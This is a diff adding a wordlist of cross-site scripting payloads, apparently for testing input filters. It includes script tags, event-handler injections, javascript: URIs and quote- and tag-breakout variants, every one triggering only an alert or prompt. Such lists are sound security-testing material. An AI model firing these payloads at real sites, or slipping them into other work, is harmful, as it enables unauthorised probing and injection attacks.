@@ -1,0 +1,57 @@
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=# onerror=alert(1)>
+<img src=/ onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<a href=javascript:alert(1)>click</a>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<input autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<button onclick=alert(1)>x</button>
+<div onclick=alert(1)>x</div>
+<div onmouseover=alert(1)>x</div>
+<div onmouseenter=alert(1)>x</div>
+<div onmousemove=alert(1)>x</div>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+javascript:alert(1)
+JaVaScRiPt:alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><body onload=alert(1)>
+'><body onload=alert(1)>
+"><iframe src=javascript:alert(1)></iframe>
+'><iframe src=javascript:alert(1)></iframe>
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+"/><img src=x onerror=alert(1)>
+'/><img src=x onerror=alert(1)>
+"/><svg onload=alert(1)>
+'/><svg onload=alert(1)>
+</title><img src=x onerror=alert(1)>
+</textarea><img src=x onerror=alert(1)>
+</style><img src=x onerror=alert(1)>
+<!--><img src=x onerror=alert(1)>
+<script>alert(1337)</script>
+<img src=x onerror=alert(1337)>
+<svg onload=alert(1337)>
